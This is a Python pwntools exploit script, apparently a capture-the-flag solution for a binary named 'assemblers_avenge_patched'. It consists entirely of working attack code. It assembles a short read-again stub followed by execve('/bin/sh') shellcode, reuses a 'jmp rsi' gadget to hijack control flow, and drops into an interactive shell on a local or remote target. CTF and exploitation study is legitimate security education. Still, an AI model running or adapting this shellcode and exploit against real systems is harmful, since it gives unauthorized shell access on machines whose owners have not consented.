#!/usr/bin/env python3

from pwn import *

e = ELF("./assemblers_avenge_patched")
# libc = elf('./libc.so.6')
# rop = ROP(e)

context.binary = e
context.terminal = ['tmux', 'split', '-h']


def conn():
    if args.LOCAL:
        r = process([e.path])
    elif args.GDB:
          # TODO: add break points, e.g. b *(_main + 0x12)
        r = gdb.debug([e.path], '''
                      b *(_read+0x23)
                      c
                      ''')
    elif args.REMOTE:
        ip, port = args.REMOTE.split(':')
        r = remote(ip, port)
    else:
        error('unknown running mode for the script')

    return r


def main():
    r = conn()

    # We first let the shellcode read again with more space.
    # We use the existing rdx=0x18 to save buffer room for "jmp rsi""
    read_again = asm('''
             sub rsi, 0x18
             push 0x0
             pop rax
             push 0x0
             pop rdi
             syscall
             jmp rsi
             ''')
    success(f'The read again shellcode has length {len(read_again)}')
    # The real execve(/bin/sh) which is 17-bytes
    bin_sh = next(e.search(b'/bin/sh'))
    sc = asm(f'''
             push 0x3b
             pop rax
             push {bin_sh}
             pop rdi
             push 0x0
             pop rsi
             push 0x0
             pop rdx
             syscall
             ''')
    success(f'The execve(/bin/sh) shellcode has length {len(sc)}')
    jmp_rsi = next(e.search(asm('jmp rsi')))
    payload = flat({
        0: read_again,
        16: jmp_rsi,
        24: sc,
        }, filler=b'\x90')
    r.sendlineafter(b'/bin/sh', payload)

    r.interactive()

if __name__ == "__main__":
    main()
